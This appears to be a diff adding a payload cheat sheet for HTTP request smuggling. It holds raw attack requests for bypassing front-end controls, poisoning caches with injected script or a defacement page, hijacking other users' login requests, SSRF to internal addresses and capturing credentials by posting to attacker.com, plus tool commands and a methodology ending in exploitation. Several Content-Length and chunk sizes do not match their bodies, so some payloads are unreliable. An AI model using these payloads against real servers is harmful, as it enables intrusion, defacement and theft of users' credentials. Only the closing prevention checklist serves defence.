@@ -1,0 +1,440 @@
+# HTTP Request Smuggling Payloads
+
+## ========================================
+## CL.TE (Content-Length / Transfer-Encoding)
+## ========================================
+
+# Front-end uses Content-Length
+# Back-end uses Transfer-Encoding
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 49
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+
+## ========================================
+## TE.CL (Transfer-Encoding / Content-Length)
+## ========================================
+
+# Front-end uses Transfer-Encoding
+# Back-end uses Content-Length
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GET /admin HTTP/1.1
+Host: target.com
+Content-Length: 10
+
+x=
+0
+
+
+## ========================================
+## TE.TE (Transfer-Encoding obfuscation)
+## ========================================
+
+# Both use Transfer-Encoding but can be fooled
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+
+## ========================================
+## CACHE POISONING
+## ========================================
+
+# Poison web cache
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: attacker.com
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<script>alert(document.domain)</script>
+
+## ========================================
+## BYPASSING FRONT-END CONTROLS
+## ========================================
+
+# Access admin panel
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+## ========================================
+## REQUEST HIJACKING
+## ========================================
+
+# Hijack other users' requests
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+username=victim&password=
+
+## ========================================
+## XSS VIA SMUGGLING
+## ========================================
+
+# Inject XSS payload
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+5e
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: target.com
+
+0
+
+
+## ========================================
+## HEADER INJECTION
+## ========================================
+
+# Inject malicious headers
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: target.com
+X-Evil-Header: injected
+
+
+## ========================================
+## DOUBLE CHUNKED
+## ========================================
+
+# Obfuscate Transfer-Encoding
+
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+## ========================================
+## SPACE OBFUSCATION
+## ========================================
+
+# Space before chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+
+## ========================================
+## TAB OBFUSCATION
+## ========================================
+
+# Tab character
+
+Transfer-Encoding:\tchunked
+Transfer-Encoding: \tchunked
+
+## ========================================
+## NEWLINE OBFUSCATION
+## ========================================
+
+# Newline in header
+
+Transfer-Encoding
+ : chunked
+
+Transfer-Encoding:
+ chunked
+
+## ========================================
+## CASE VARIATION
+## ========================================
+
+# Mixed case
+
+Transfer-Encoding: Chunked
+Transfer-Encoding: chUnked
+Transfer-Encoding: CHUNKED
+
+## ========================================
+## EXPLOITING TIMING
+## ========================================
+
+# Detect vulnerability via timing
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+Q
+
+# If vulnerable, server hangs waiting for chunk
+
+## ========================================
+## TESTING FOR CL.TE
+## ========================================
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+
+# If next request gets 404, vulnerable to CL.TE
+
+## ========================================
+## TESTING FOR TE.CL
+## ========================================
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+SMUGGLED
+0
+
+
+# If "SMUGGLED" appears in next request, vulnerable
+
+## ========================================
+## BYPASSING WAF
+## ========================================
+
+# Smuggle past WAF
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /admin?cmd=whoami HTTP/1.1
+Host: target.com
+
+
+## ========================================
+## SSRF VIA SMUGGLING
+## ========================================
+
+# Access internal services
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: 192.168.1.1
+
+
+## ========================================
+## CREDENTIAL CAPTURE
+## ========================================
+
+# Capture credentials
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+POST /capture HTTP/1.1
+Host: attacker.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- HTTP Request Smuggler extension
+- Manually craft in Repeater
+
+# Smuggler.py
+python smuggler.py -u https://target.com
+
+# h2csmuggler
+python h2csmuggler.py https://target.com
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+# Differential responses
+Send smuggled request
+Compare responses
+
+# Timing-based
+Monitor response times
+Hang indicates vulnerability
+
+## ========================================
+## HTTP/2 SMUGGLING
+## ========================================
+
+# Downgrade attack
+HTTP/2 to HTTP/1.1 conversion issues
+
+# Pseudo-headers
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+GET /admin HTTP/1.1
+
+
+## ========================================
+## CHUNKED VARIATIONS
+## ========================================
+
+# Standard
+5
+HELLO
+0
+
+# With chunk extension
+5;name=value
+HELLO
+0
+
+# With trailer
+5
+HELLO
+0
+Trailer: value
+
+## ========================================
+## REAL-WORLD TARGETS
+## ========================================
+
+# Common vulnerable setups
+- HAProxy + Gunicorn
+- Nginx + Puma
+- Apache + Tomcat
+- AWS ALB + EC2
+- Cloudflare + Origin
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify architecture
+- Reverse proxy + backend server
+
+# 2. Test CL.TE
+- Send CL.TE payloads
+
+# 3. Test TE.CL
+- Send TE.CL payloads
+
+# 4. Test TE.TE
+- Try obfuscation techniques
+
+# 5. Confirm vulnerability
+- Verify with harmless payloads
+
+# 6. Exploit
+- Admin access, XSS, credential capture
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Admin access
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+
+# Example 2: Poison cache
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: attacker.com
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><body><h1>Defaced</h1></body></html>
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if server:
+- Normalizes headers
+- Validates Content-Length
+- Rejects ambiguous requests
+- Uses HTTP/2 only
+- Has proper connection handling
